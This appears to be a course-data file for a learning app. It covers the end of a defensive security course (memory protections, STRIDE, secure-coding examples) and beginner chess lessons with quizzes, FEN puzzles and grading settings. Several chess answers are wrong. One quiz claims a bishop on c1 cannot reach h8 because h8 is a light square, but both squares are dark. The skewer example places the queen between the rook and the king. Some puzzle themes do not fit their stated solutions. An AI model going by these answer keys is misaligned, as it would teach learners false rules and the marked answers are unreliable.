          { q: 'ASLR randomizes…', choices: ['Passwords', 'Memory addresses', 'File names', 'Network ports'], answerIdx: 1, why: 'ASLR (Address Space Layout Randomization) randomizes memory addresses.' },
          { q: 'What does DEP/NX do?', choices: ['Encrypts data', 'Marks memory non-executable', 'Speeds up programs', 'Logs attacks'], answerIdx: 1, why: 'DEP/NX marks certain memory regions (like stack) as non-executable.' },
          { q: 'Defense in depth means…', choices: ['One strong firewall', 'Multiple layered protections', 'Deep encryption', 'Underground servers'], answerIdx: 1, why: 'Defense in depth uses multiple overlapping security controls.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'System hardening plan', timeMin: 40,
          brief: 'Design a system hardening plan: list 5 specific security features/protections, explain what each prevents, and describe how they work together (defense in depth).',
          requirements: ['5 security features', 'what each prevents', 'how they complement each other', 'defense in depth explained', '150+ words'],
          passScore: 75, rewardNim: 5, xp: 160,
          evaluator: { type: 'text', config: { minWords: 140, targetWords: 200, keyConcepts: ['aslr', 'dep', 'canary', 'defense', 'harden', 'security'], keyConceptRatio: 0.5, headings: 2 } },
        },
      },
      {
        slug: 'security-best-practices', title: 'Security Best Practices', estMin: 40, difficulty: 3,
        lesson: {
          tldr: 'Secure coding, threat modeling, and continuous testing create resilient systems.',
          sections: [
            { h: 'Secure coding principles', body: 'Input validation (whitelist > blacklist). Output encoding (context-specific). Least privilege. Fail securely. Defense in depth. Assume breach.' },
            { h: 'Threat modeling', body: 'Identify assets, threats, vulnerabilities. STRIDE framework: Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege.' },
            { h: 'Security testing', body: 'Static analysis (automated code review). Dynamic analysis (fuzzing). Penetration testing. Bug bounties. Continuous security, not one-time audit.' },
          ],
          example: { lang: 'python', code: '# Input validation (whitelist)\nimport re\ndef validate_email(email):\n    pattern = r\'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$\'\n    return bool(re.match(pattern, email))\n\n# Output encoding (context-specific)\nimport html\nsafe_html = html.escape(user_input)\n\n# Parameterized queries\ncursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))\n\n# Security headers\nresponse.headers[\'X-Frame-Options\'] = \'DENY\'\nresponse.headers[\'Content-Security-Policy\'] = "default-src \'self\'"' },
          ask: 'What does "assume breach" mean in security design?',
          keyPoints: ['Prevention, detection, response — all three needed', 'Security is continuous, not one-time', 'Code review catches bugs early', 'Threat modeling identifies risks before building'],
          misconception: '"Security is the security team\'s job." Security is everyone\'s responsibility — especially developers.',
        },
        practice: [
          { q: 'What\'s better: whitelist or blacklist?', choices: ['Blacklist', 'Whitelist', 'Both equal', 'Neither'], answerIdx: 1, hint: 'Default deny.', why: 'Whitelists allow only known-good, blacklists try to block known-bad (always incomplete).' },
          { q: 'What does STRIDE help you do?', choices: ['Write code', 'Model threats', 'Test performance', 'Deploy apps'], answerIdx: 1, hint: 'Threat modeling framework.', why: 'STRIDE is a framework for identifying threat categories.' },
        ],
        quiz: [
          { q: 'Which is better for validation?', choices: ['Blacklist', 'Whitelist', 'Both equal', 'Neither'], answerIdx: 1, why: 'Whitelists allow only known-good; blacklists try to block all bad (impossible to complete).' },
          { q: 'STRIDE is a framework for…', choices: ['Encryption', 'Threat modeling', 'Password storage', 'Network routing'], answerIdx: 1, why: 'STRIDE (Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege) is for threat modeling.' },
          { q: '"Assume breach" means…', choices: ['Give up', 'Design assuming attackers will get in', 'Always be paranoid', 'Use weak security'], answerIdx: 1, why: 'Assume breach means designing systems to limit damage even when attackers penetrate defenses.' },
        ],
        challenge: {
          type: 'explain', kind: 'final', title: 'Complete security assessment', timeMin: 60,
          brief: 'Perform a comprehensive security analysis of a hypothetical web application: threat model (STRIDE), identify 5 potential vulnerabilities with technical details, propose mitigations, and outline a security testing strategy.',
          requirements: ['STRIDE threat model', '5 vulnerabilities with details', 'mitigation for each', 'testing strategy', '250+ words with clear sections'],
          passScore: 75, rewardNim: 8, xp: 200,
          evaluator: { type: 'text', config: { minWords: 240, targetWords: 320, keyConcepts: ['threat', 'vulnerability', 'mitigation', 'stride', 'security', 'test'], keyConceptRatio: 0.45, headings: 4 } },
        },
      },
    ],
    finalAssessment: {
      type: 'explain', kind: 'final', title: 'Final Skill Assessment: Security Analysis Report', timeMin: 60,
      brief: 'Write a comprehensive security analysis report for a hypothetical small business web application: identify 3 potential vulnerabilities (with technical details), explain exploitation scenarios, propose mitigation strategies, and outline a basic security monitoring plan.',
      requirements: ['3 vulnerabilities with technical details', 'exploitation scenarios', 'mitigation strategies', 'monitoring plan', '300+ words with sections'],
      passScore: 75, rewardNim: 8, xp: 400,
      evaluator: { type: 'text', config: { minWords: 280, targetWords: 400, keyConcepts: ['vulnerability', 'exploit', 'mitigation', 'security', 'access', 'attack', 'protection'], keyConceptRatio: 0.45, headings: 4 } },
    },
  }),

  /* ════════════════════════════ CHESS ══════════════════════════════ */
  'chess': T({
    goalKeywords: ['chess', 'strategy', 'tactics', 'openings', 'endgame', 'grandmaster', 'checkmate', 'chess pieces', 'chess board', 'chess strategy', 'chess tactics', 'chess openings', 'chess endgames', 'chess puzzles', 'learn chess', 'chess lessons', 'chess training', 'improve at chess', 'chess master', 'chess game'],
    topics: [
      /* ══════ LEVEL 1: FUNDAMENTALS ══════ */
      {
        slug: 'board-basics',
        title: 'Board Basics & Piece Movement',
        estMin: 30,
        difficulty: 1,
        lesson: {
          tldr: 'The chessboard is an 8×8 grid where pieces move according to specific rules. Understanding coordinates and piece movement is the foundation of all chess.',
          sections: [
            { h: 'The Chessboard', body: 'The board has 64 squares (8 rows × 8 columns). Rows are numbered 1-8, columns are labeled a-h. White always starts from rows 1-2, Black from rows 7-8. The board is positioned so a white square is in each player\'s right corner.' },
            { h: 'The Pieces', body: 'Each player starts with: 1 King (most important), 1 Queen (most powerful), 2 Rooks, 2 Bishops, 2 Knights, and 8 Pawns. The King moves one square in any direction. The Queen moves any number of squares in any direction. Rooks move horizontally or vertically. Bishops move diagonally. Knights move in an L-shape (2 squares one way, 1 square perpendicular). Pawns move forward one square (two on first move), capture diagonally.' },
            { h: 'Coordinate System', body: 'Every square has a unique name: column letter + row number. For example, e4, d7, h1. This notation lets you record and replay games. The bottom-left square for White is a1, top-right is h8.' },
          ],
          example: {
            lang: 'fen',
            fen: 'rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1',
            description: 'Standard starting position. Each piece has its unique movement pattern. White\'s king on e1 can move to d1, d2, e2, f2, or f1.'
          },
          ask: 'If a rook is on a1, which squares can it move to?',
          keyPoints: [
            '64 squares: a1 (bottom-left) to h8 (top-right)',
            'King: one square any direction (most important)',
            'Queen: any direction, any distance (most powerful)',
            'Rook: horizontal/vertical lines',
            'Bishop: diagonal lines',
            'Knight: L-shape (only piece that jumps)',
            'Pawn: forward one (or two on first move), captures diagonally'
          ],
          misconception: '"Bishops can reach any square." Bishops stay on their starting color forever — light-squared bishops never reach dark squares.'
        },
        practice: [
          {
            q: 'On an empty board, if a bishop is on c1, can it reach h8?',
            choices: ['No, bishops can\'t move that far', 'Yes, along the diagonal', 'Only if it captures', 'No, wrong color square'],
            answerIdx: 3,
            hint: 'Check the square colors.',
            why: 'c1 is a dark square, h8 is a light square. Bishops never change square color, so a dark-squared bishop can never reach h8.'
          },
          {
            q: 'Which piece can jump over other pieces?',
            choices: ['Queen', 'Rook', 'Knight', 'Bishop'],
            answerIdx: 2,
            hint: 'Think about the L-shaped move.',
            why: 'Knights are the only pieces that can jump over others. All other pieces are blocked by pieces in their path.'
          }
        ],
        quiz: [
          {
            q: 'How many squares can a king move from the center of an empty board?',
            choices: ['4 squares', '6 squares', '8 squares', '1 square'],
            answerIdx: 2,
            why: 'The king can move one square in any direction: up, down, left, right, and four diagonals = 8 squares total.'
          },
          {
            q: 'What is the name of the bottom-left square for White?',
            choices: ['a8', 'h1', 'a1', 'h8'],
            answerIdx: 2,
            why: 'Columns go a-h from left to right, rows go 1-8 from bottom to top for White. Bottom-left is a1.'
          },
          {
            q: 'Can a pawn move backwards?',
            choices: ['Yes, one square', 'Yes, when capturing', 'No, never', 'Only on first move'],
            answerIdx: 2,
            why: 'Pawns can only move forward, never backwards. This makes pawn moves irreversible and strategic.'
          }
        ],
        recall: [
            'What square is the bottom-left corner for White?',
            'How many squares can a king move from the center of an empty board?',
            'Can a bishop on c1 ever reach h8? Why or why not?',
            'Which piece can jump over other pieces?'
          ],

        challenge: {
          type: 'chess',
          kind: 'interactive-board',
          title: 'Set Up the Board',
          timeMin: 15,
          brief: 'Use the interactive chess board to correctly place all pieces in their starting positions. Then practice moving each piece type.',
          fen: 'start', // Standard starting position
          tasks: [
            'Identify all piece starting positions',
            'Move a knight from starting position',
            'Show all squares a queen can reach from d1',
            'Move a pawn forward two squares on its first move'
          ],
          requirements: ['correct piece placement', 'demonstrate piece movement', 'understand coordinates'],
          passScore: 100,
          rewardNim: 2,
          xp: 100,
          evaluator: { type: 'chess', config: { mode: 'setup', verifyPlacement: true, testMoves: true } }
        }
      },
      {
        slug: 'special-moves',
        title: 'Special Moves & Game Rules',
        estMin: 30,
        difficulty: 1,
        lesson: {
          tldr: 'Chess has special moves (castling, en passant, promotion) and unique rules (check, checkmate, stalemate, draw) that every player must know.',
          sections: [
            { h: 'Castling', body: 'Once per game, you can move your king 2 squares toward a rook, and that rook hops over to the other side. Requirements: neither piece has moved, no pieces between them, king not in check, king doesn\'t pass through or land in check. Kingside castling (O-O): king moves from e1 to g1, rook from h1 to f1. Queenside castling (O-O-O): king to c1, rook to d1.' },
            { h: 'En Passant', body: 'Special pawn capture. If an enemy pawn moves 2 squares forward from its starting position and lands beside your pawn, you can capture it as if it only moved 1 square. Must be done immediately on the next move or the right is lost. Example: White pawn on e5, Black plays d7-d5. White can play exd6, removing Black\'s d5 pawn and moving to d6.' },
            { h: 'Pawn Promotion', body: 'When a pawn reaches the opposite end of the board (8th rank for White, 1st rank for Black), it must be promoted to a Queen, Rook, Bishop, or Knight (player\'s choice). Usually promote to Queen (most powerful), but underpromotion to Knight can be useful for delivering check.' },
            { h: 'Check, Checkmate, Stalemate', body: 'Check: King is under attack and must get out of danger. Checkmate: King is in check with no legal moves to escape — game over. Stalemate: Player to move has no legal moves but is NOT in check — game is a draw. Draw also occurs by repetition (same position 3 times), 50-move rule (50 moves without pawn move or capture), or mutual agreement.' }
          ],
          example: {
            lang: 'text',
            code: 'Castling Kingside:\nBefore: King e1, Rook h1\nAfter: King g1, Rook f1\n\nEn Passant:\nPosition: White pawn e5, Black plays d7-d5\nWhite can capture: exd6 (pawn moves to d6, Black\'s d5 pawn removed)\n\nPromotion:\nWhite pawn on e7 → moves to e8\nPlayer chooses: e8=Q (becomes Queen)\n\nCheckmate Example:\nBlack King on h8, White Queen on g7, White King on f6\nBlack King has no escape — checkmate!'
          },
          ask: 'Can you castle if your king has been in check (but moved out)?',
          keyPoints: [
            'Castling: King moves 2 squares, rook hops over (once per game)',
            'Castling conditions: pieces haven\'t moved, no pieces between, not through check',
            'En passant: Special pawn capture (must do immediately)',
            'Promotion: Pawn reaches end → becomes Queen/Rook/Bishop/Knight',
            'Check: King under attack, must get out',
            'Checkmate: King in check with no escape → you win',
            'Stalemate: No legal moves but not in check → draw'
          ],
          misconception: '"You can castle out of check." No! The king cannot be in check when castling, pass through check, or land in check.'
        },
        practice: [
          {
            q: 'Can you castle if your rook has moved and moved back?',
            choices: ['Yes, as long as it\'s back', 'No, once a piece moves castling is lost', 'Yes, but only queenside', 'Depends on the position'],
            answerIdx: 1,
            hint: 'Castling rights are lost forever.',
            why: 'Once either the king or rook moves, castling rights with that rook are permanently lost, even if the piece returns to its starting square.'
          },
          {
            q: 'If your pawn reaches the end, must you promote it to a Queen?',
            choices: ['Yes, always Queen', 'No, you can choose any piece except King', 'Only Queen or Rook', 'You can leave it as a pawn'],
            answerIdx: 1,
            hint: 'Any piece except King or Pawn.',
            why: 'You can promote to Queen, Rook, Bishop, or Knight. Most choose Queen, but Knight can be useful for delivering check.'
          }
        ],
        quiz: [
          {
            q: 'What is the only way to get out of check?',
            choices: ['Block, move king, or capture attacking piece', 'Capture the attacking piece', 'Move the king only', 'Castle away'],
            answerIdx: 0,
            why: 'Three ways to escape check: 1) Block the attack, 2) Move the king to safety, or 3) Capture the attacking piece. You cannot castle out of check.'
          },
          {
            q: 'What is stalemate?',
            choices: ['King is checkmated', 'No legal moves and not in check', 'Both players agree to draw', 'Same position appears twice'],
            answerIdx: 1,
            why: 'Stalemate is when the player to move has no legal moves and is NOT in check. It\'s a draw, not a loss.'
          },
          {
            q: 'Can you castle through an attacked square?',
            choices: ['Yes, only the king matters', 'No, the king cannot pass through check', 'Yes, if you move fast', 'Only in blitz games'],
            answerIdx: 1,
            why: 'The king cannot pass through a square that is under attack (even though it doesn\'t stop there). Castling requirements are strict.'
          }
        ],
        recall: [
            'What two conditions must be met to castle kingside?',
            'When can you capture en passant?',
            'What pieces can a pawn promote to?',
            'Can you castle if your king has moved and moved back?'
          ],

        challenge: {
          type: 'chess',
          kind: 'special-moves',
          title: 'Master Special Moves',
          timeMin: 20,
          brief: 'Practice castling, en passant, and promotion in various positions. Demonstrate understanding of check, checkmate, and stalemate.',
          scenarios: [
            { name: 'Castle', fen: 'r3k2r/8/8/8/8/8/8/R3K2R w KQkq - 0 1', task: 'Castle either side: move your king two squares toward the rook.', hint: 'Kingside is e1 to g1; queenside is e1 to c1.' },
            { name: 'En passant', fen: 'rnbqkbnr/pppp1ppp/8/3Pp3/8/8/PPP1PPPP/RNBQKBNR w KQkq e6 0 3', task: 'Capture en passant: play dxe6 and remove the pawn that just advanced.', hint: 'The target square e6 is available for this move only.' },
            { name: 'Promote', fen: '7k/5KP1/8/8/8/8/8/8 w - - 0 1', task: 'Promote the pawn on g7. A queen promotion is checkmate.', hint: 'Move g7 to g8 and choose a queen.' }
          ],
          requirements: ['demonstrate castling', 'execute en passant', 'promote pawn', 'identify check vs checkmate vs stalemate'],
          passScore: 100,
          rewardNim: 3,
          xp: 120,
          evaluator: { type: 'chess', config: { mode: 'special-moves', scenarios: 3, requireAll: true } }
        }
      },
      {
        slug: 'chess-notation',
        title: 'Chess Notation & Recording Games',
        estMin: 25,
        difficulty: 1,
        lesson: {
          tldr: 'Algebraic notation is the universal language of chess. Learning to read and write moves lets you study games, share positions, and improve your understanding.',
          sections: [
            { h: 'Piece Abbreviations', body: 'K = King, Q = Queen, R = Rook, B = Bishop, N = Knight (K was taken!), Pawn = no letter. When writing moves, you put the piece letter, then the destination square. Example: Nf3 means "Knight moves to f3". Pawns: just write the destination square (e4, d5).' },
            { h: 'Captures and Checks', body: 'x = capture. Example: Bxf7 means "Bishop captures on f7". For pawn captures, include the starting file: exd5 means "e-pawn captures on d5". + = check. # = checkmate. Examples: Qh5+ (Queen to h5, check), Qxf7# (Queen captures f7, checkmate).' },
            { h: 'Disambiguating Moves', body: 'When two pieces of the same type can move to the same square, specify which: include the file (Nbd7), rank (N1e2), or both (Qa1c1) if needed. Castling: O-O (kingside), O-O-O (queenside). Promotion: e8=Q (pawn promotes to Queen).' },
            { h: 'PGN (Portable Game Notation)', body: 'Standard format for recording games. Includes moves, players, date, result. Moves are numbered: 1. e4 e5 2. Nf3 Nc6 3. Bb5 means "move 1: White plays e4, Black plays e5. Move 2: White plays Nf3, Black plays Nc6", etc. Result: 1-0 (White wins), 0-1 (Black wins), 1/2-1/2 (draw).' }
          ],
          example: {
            lang: 'text',
            code: 'Sample Game:\n1. e4 e5\n2. Nf3 Nc6\n3. Bb5 a6\n4. Ba4 Nf6\n5. O-O Be7\n6. Re1 b5\n7. Bb3 d6\n8. c3 O-O\n\nExplanation:\n1. e4 = White pawn to e4\n1... e5 = Black pawn to e5\n2. Nf3 = White knight to f3\n5. O-O = White castles kingside\n7... d6 = Black pawn to d6\n8... O-O = Black castles kingside\n\nCapture example:\n10. Bxf7+ Kxf7\n(Bishop captures f7 with check, King captures bishop)\n\nDisambiguation:\nRae1 (Rook from a-file to e1)\nN1d2 (Knight from 1st rank to d2)'
          },
          ask: 'How would you write "Knight on g1 moves to f3"?',
          keyPoints: [
            'Piece letters: K Q R B N (Pawns have no letter)',
            'Format: Piece + Destination (Nf3, Bc4, e4)',
            'Captures: use x (Bxf7, exd5)',
            'Check: + (Qh5+), Checkmate: # (Qxf7#)',
            'Castling: O-O (kingside), O-O-O (queenside)',
            'Promotion: e8=Q',
            'Disambiguation: add file/rank when needed (Nbd7, R1e2)'
          ],
          misconception: '"You need to write every detail." No! Only disambiguate when necessary. Nf3 is fine if only one knight can go to f3.'
        },
        practice: [
          {
            q: 'What does the move "Bxf7+" mean?',
            choices: ['Bishop to f7', 'Bishop captures f7 with check', 'Bishop blocks f7', 'Bishop protects f7'],
            answerIdx: 1,
            hint: 'x means capture, + means check.',
            why: 'B = Bishop, x = captures, f7 = destination square, + = check. So "Bishop captures the piece on f7, putting the enemy king in check."'
          },
          {
            q: 'How do you write "pawn on e-file captures on d5"?',
            choices: ['exd5', 'Pxd5', 'ed5', 'e×d5'],
            answerIdx: 0,
            hint: 'Show the starting file for pawn captures.',
            why: 'Pawn captures are written as: starting file + x + destination square. So "exd5" means e-pawn captures on d5.'
          }
        ],
        quiz: [
          {
            q: 'What does "O-O-O" mean?',
            choices: ['Three moves in a row', 'Queenside castling', 'Triple check', 'Three captures'],
            answerIdx: 1,
            why: 'O-O-O represents queenside (long) castling, where the king moves toward the a-file rook. O-O is kingside castling.'
          },
          {
            q: 'If two knights can both move to e2, how do you specify the one on d4?',
            choices: ['Ne2', 'Nde2', 'N4e2', 'Knight d4-e2'],
            answerIdx: 1,
            why: 'Include the file (d) to disambiguate: Nde2 means "Knight from the d-file moves to e2". If they\'re on the same file, use the rank instead.'
          },
          {
            q: 'What does "1-0" mean at the end of a game?',
            choices: ['White wins', 'Draw', 'Black wins', 'Game continues'],
            answerIdx: 0,
            why: '1-0 means White wins, 0-1 means Black wins, 1/2-1/2 means draw. This is standard PGN result notation.'
          }
        ],
        recall: [
            'How do you write a pawn capture from e4 to d5 in algebraic notation?',
            'What does O-O mean in chess notation?',
            'How do you indicate checkmate in notation?',
            'What does Nbd7 mean (why include the "b")?'
          ],

        challenge: {
          type: 'chess',
          kind: 'notation',
          title: 'Read and Write Chess Moves',
          timeMin: 25,
          brief: 'Given a series of moves in algebraic notation, set up the position on the board. Then, given positions, write the correct notation for specified moves.',
          tasks: [
            { type: 'read', moves: '1. e4 e5 2. Nf3 Nc6 3. Bb5 a6 4. Ba4 Nf6 5. O-O', verify: 'fen' },
            { type: 'write', fen: 'r1bqkb1r/pppp1ppp/2n2n2/4p3/2B1P3/5N2/PPPP1PPP/RNBQK2R w KQkq - 4 4', move: 'Bxf7+' },
            { type: 'write', fen: 'rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1', move: 'Nf3' }
          ],
          requirements: ['read notation accurately', 'write moves in standard algebraic notation', 'handle captures and checks'],
          passScore: 100,
          rewardNim: 2,
          xp: 100,
          evaluator: { type: 'chess', config: { mode: 'notation', tasks: 3, exactNotation: true } }
        }
      },
      {
        slug: 'fundamental-tactics',
        title: 'Fundamental Tactics: Pin, Fork, Skewer',
        estMin: 35,
        difficulty: 1,
        lesson: {
          tldr: 'Tactical patterns are the building blocks of chess combinations. The pin, fork, and skewer are three fundamental patterns every player must recognize instantly.',
          sections: [
            { h: 'The Pin', body: 'A pin occurs when a piece cannot move without exposing a more valuable piece behind it. Absolute pin: piece is pinned to the King (illegal to move). Relative pin: moving loses material but is legal. Example: bishop on b5 pinning knight on c6 to king on e8. The knight cannot move without exposing the king to check.' },
            { h: 'The Fork', body: 'A fork attacks two or more pieces simultaneously. Knights are excellent forking pieces due to their unique movement. The "royal fork" attacks both king and queen. Pawns, bishops, rooks, and queens can also fork. Example: knight on e5 can fork king on g6 and rook on c6.' },
            { h: 'The Skewer', body: 'A skewer is a reverse pin: a valuable piece is attacked and must move, exposing a less valuable piece behind it. Queens, rooks, and bishops can skewer. Example: rook on a1 attacks king on a8. King must move, then rook captures queen on a4.' },
          ],
          example: {
            lang: 'text',
            code: 'Pin Example:\nWhite: Bishop b5, Queen d1\nBlack: Knight c6, King e8\nThe bishop pins the knight — if it moves, the king is in check.\n\nFork Example:\nWhite: Knight e5\nBlack: King g6, Rook c6, Pawn d7\nKnight can fork: Nxd7 (attacks king and rook) or Nf7+ (attacks king and rook)\n\nSkewer Example:\nWhite: Rook a1\nBlack: King a8, Queen a4\nRa1+ forces Ka7 (or moves along a-file), then Rxa4 wins the queen.'
          },
          ask: 'Can you identify a pin in your current games?',
          keyPoints: [
            'Pin: piece cannot move without exposing valuable piece',
            'Absolute pin: pinned to king (illegal to move)',
            'Relative pin: legal but loses material',
            'Fork: attacks multiple pieces simultaneously',
            'Knights excel at forking (L-shaped movement)',
            'Skewer: valuable piece forced to move, exposing weaker piece',
            'Long-range pieces (Q, R, B) can pin and skewer'
          ],
          misconception: '"Only knights can fork." All pieces can fork — knights are just best at it due to their unique movement.'
        },
        practice: [
          {
            q: 'What is an absolute pin?',
            choices: ['A pin worth 100 points', 'A pin to the king (illegal to move)', 'A pin that lasts the whole game', 'A pin by a knight'],
            answerIdx: 1,
            hint: 'Think about check rules.',
            why: 'An absolute pin is when a piece is pinned to the king. Moving the pinned piece would expose the king to check, which is illegal.'
          },
          {
            q: 'Which pieces can execute a skewer?',
            choices: ['Only queens', 'Knights and bishops', 'Queens, rooks, and bishops (long-range)', 'All pieces'],
            answerIdx: 2,
            hint: 'Need to attack along a line.',
            why: 'Skewers require attacking along a line (rank, file, or diagonal), so only long-range pieces (queen, rook, bishop) can execute them.'
          }
        ],
        quiz: [
          {
            q: 'In a fork, what is the minimum number of pieces attacked?',
            choices: ['One', 'Two', 'Three', 'Four'],
            answerIdx: 1,
            why: 'A fork attacks at least two pieces simultaneously. The power of a fork is forcing the opponent to lose material.'
          },
          {
            q: 'Can a pawn execute a fork?',
            choices: ['No, only knights fork', 'Yes, pawns can fork two pieces', 'Only when promoted', 'Only on the first move'],
            answerIdx: 1,
            why: 'Pawns absolutely can fork! A pawn attacks two diagonal squares, so it can fork two pieces on those squares.'
          },
          {
            q: 'What is the difference between a pin and a skewer?',
            choices: ['No difference', 'Pin attacks less valuable piece first, skewer attacks more valuable first', 'Pin is by bishops, skewer by rooks', 'Skewer is horizontal only'],
            answerIdx: 1,
            why: 'Pin: valuable piece behind (protected by less valuable). Skewer: valuable piece in front (must move, exposing less valuable).'
          }
        ],
        recall: [
            'What is a fork in chess?',
            'Describe what a pin is and why it\'s powerful',
            'How is a skewer different from a pin?',
            'What is a discovered attack?'
          ],

        challenge: {
          type: 'chess',
          kind: 'puzzle',
          title: 'Master Fundamental Tactics',
          timeMin: 25,
          brief: 'Solve 6 tactical puzzles: 2 pins, 2 forks, 2 skewers. Find the winning tactical blow in each position.',
          puzzles: [
            { theme: 'pin', fen: 'r1bqk2r/pppp1ppp/2n2n2/2b1p3/2B1P3/2N2N2/PPPP1PPP/R1BQK2R w KQkq - 0 5', solution: ['Bxf7+'], hint: 'Pin the king to win material' },
            { theme: 'pin', fen: '2kr3r/ppp2ppp/2n5/3Pp3/2P5/2N5/PP3PPP/R1B1K2R w KQ - 0 10', solution: ['Bg5'], hint: 'Pin the knight to the king' },
            { theme: 'fork', fen: 'r1bqkb1r/pppp1ppp/2n2n2/4p3/2B1P3/5N2/PPPP1PPP/RNBQK2R w KQkq - 4 4', solution: ['Nxe5'], hint: 'Fork two pieces' },
            { theme: 'fork', fen: 'rnbqkb1r/ppp2ppp/4pn2/3p4/2PP4/2N5/PP2PPPP/R1BQKBNR w KQkq - 0 4', solution: ['Nxd5'], hint: 'Knight fork' },
            { theme: 'skewer', fen: 'r3k2r/8/8/8/8/8/8/R3K2R w KQkq - 0 1', solution: ['Rxa8+'], hint: 'Capture the rook with check, then win the remaining rook' },
            { theme: 'skewer', fen: '4k3/8/8/8/8/8/8/R3K2R w KQ - 0 1', solution: ['Ra8+'], hint: 'Force the king to move' }
          ],
          requirements: ['identify tactic type', 'find best move', 'explain why it works'],
          passScore: 80,
          rewardNim: 3,
          xp: 140,
          evaluator: { type: 'chess', config: { mode: 'puzzle', puzzleCount: 6, exactMoves: true, stockfishVerify: true } }
        }
      },
      {
        slug: 'opening-principles',
        title: 'Opening Principles',
        estMin: 30,
        difficulty: 1,
        lesson: {
          tldr: 'The opening phase sets the stage for the middlegame. Three core principles guide strong opening play: control the center, develop pieces quickly, and secure king safety.',
          sections: [
            { h: 'Control the Center', body: 'The center (e4, d4, e5, d5 squares) is the most important real estate. Pieces in the center control more squares and can reach either side of the board quickly. Aim to place pawns or pieces to control e4, d4, e5, d5. Common first moves: 1.e4, 1.d4, 1.c4, 1.Nf3 all fight for center control.' },
            { h: 'Develop Pieces Quickly', body: 'Develop means moving pieces from their starting squares to better squares where they control more space. Develop knights before bishops (easier to find good squares). Castle early for king safety. Don\'t move the same piece twice in the opening unless necessary. Don\'t bring the queen out too early (it can be attacked).' },
            { h: 'King Safety', body: 'Castle early (usually by move 6-10) to connect rooks and protect the king. Kingside castling (O-O) is more common and usually safer. Queenside castling (O-O-O) is more aggressive but can be riskier. Avoid weakening pawn shield in front of castled king.' },
          ],
          example: {
            lang: 'text',
            code: 'Good Opening Play:\n1. e4 e5     (Both control center)\n2. Nf3 Nc6   (Develop knights)\n3. Bc4 Bc5   (Develop bishops)\n4. O-O Nf6   (White castles)\n5. d3 O-O    (Black castles)\n\nPoor Opening Play:\n1. h3? e5    (Edge pawn doesn\'t control center)\n2. Rh2? Nf6  (Premature rook move)\n3. Qf3? Nc6  (Queen out too early)\n4. Qb3? Bc5  (Moving queen again)\n\nAfter 4 moves:\nGood: Both sides developed, castled, controlling center\nPoor: White has 4 moves but only 2 pieces developed, no center control'
          },
          ask: 'Which square is more valuable: e4 or a4?',
          keyPoints: [
            'Center squares (e4, d4, e5, d5) are most valuable',
            'Develop knights and bishops quickly',
            'Castle early (move 6-10 typically)',
            'Don\'t move same piece twice without reason',
            'Don\'t bring queen out too early',
            'Connect rooks by castling',
            'Control center before attacking'
          ],
          misconception: '"I should attack immediately." Develop pieces first! Premature attacks with undeveloped pieces usually fail.'
        },
        practice: [
          {
            q: 'What should you usually do first: castle or bring your queen out?',
            choices: ['Queen out first', 'Castle first', 'Both at same time', 'Depends on opponent'],
            answerIdx: 1,
            hint: 'Think about king safety.',
            why: 'Castle first for king safety. Bringing the queen out early makes it a target for attacks, wastes time when pieces need developing.'
          },
          {
            q: 'Which move better controls the center?',
            choices: ['1.e4', '1.h4', '1.a4', '1.Nh3'],
            answerIdx: 0,
            hint: 'Center pawns are d and e.',
            why: '1.e4 directly controls the center squares d5 and f5, and opens lines for the bishop and queen. Edge moves don\'t control center.'
          }
        ],
        quiz: [
          {
            q: 'How many central squares are there?',
            choices: ['2 squares', '4 squares', '8 squares', '16 squares'],
            answerIdx: 1,
            why: 'Four central squares: e4, d4, e5, d5. These are the most important squares in the opening.'
          },
          {
            q: 'Why castle early?',
            choices: ['To move the rook', 'For king safety and rook connection', 'To confuse opponent', 'To control center'],
            answerIdx: 1,
            why: 'Castling serves two purposes: 1) Moves king to safety away from center, 2) Connects rooks and activates the castled rook.'
          },
          {
            q: 'What is the main problem with moving your queen out early?',
            choices: ['Queen gets tired', 'It becomes a target and wastes time', 'It\'s against the rules', 'Nothing wrong with it'],
            answerIdx: 1,
            why: 'Early queen moves are problematic because the queen becomes a target for attacks. Each attack forces you to move the queen again, wasting development time.'
          }
        ],
        recall: [
            'Name the three main opening principles',
            'Which four squares make up the center of the board?',
            'Why should you develop knights before bishops?',
            'What does it mean to "control the center"?'
          ],

        challenge: {
          type: 'chess',
          kind: 'opening',
          title: 'Play the Opening Correctly',
          timeMin: 20,
          brief: 'Given three different opening positions, demonstrate the opening principles: control center, develop pieces, and castle early.',
          scenarios: [
            {
              name: 'Open Game',
              fen: 'rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1',
              task: 'Play 1.e4 and develop pieces properly',
              correctMoves: ['e4', 'Nf3', 'Bc4', 'O-O'],
              avoid: ['Qh5', 'h3', 'a3']
            },
            {
              name: 'Closed Game',
              fen: 'rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1',
              task: 'Play 1.d4 and develop naturally',
              correctMoves: ['d4', 'Nf3', 'Bf4', 'e3'],
              avoid: ['Qd3', 'h4', 'Na3']
            }
          ],
          requirements: ['control center with first move', 'develop 2+ pieces', 'castle within 6 moves', 'avoid premature attacks'],
          passScore: 85,
          rewardNim: 3,
          xp: 130,
          evaluator: { type: 'chess', config: { mode: 'opening', scenarioCount: 2, checkPrinciples: true, penalizeMistakes: true } }
        }
      },
      {
        slug: 'basic-endgames',
        title: 'Basic Endgames: King & Queen vs King',
        estMin: 30,
        difficulty: 1,
        lesson: {
          tldr: 'Endgames with few pieces require precise technique. Knowing how to deliver checkmate with king and queen (or king and rook) is essential for converting winning positions.',
          sections: [
            { h: 'King and Queen vs King', body: 'This is the most common basic checkmate. Strategy: Use queen to restrict enemy king\'s movement, gradually push it to the edge. Once on the edge, your king helps deliver checkmate. Never stalemate! Leave the enemy king at least one legal move until checkmate. The process: 1) Restrict king with queen, 2) Bring your king up, 3) Force enemy king to edge, 4) Deliver checkmate.' },
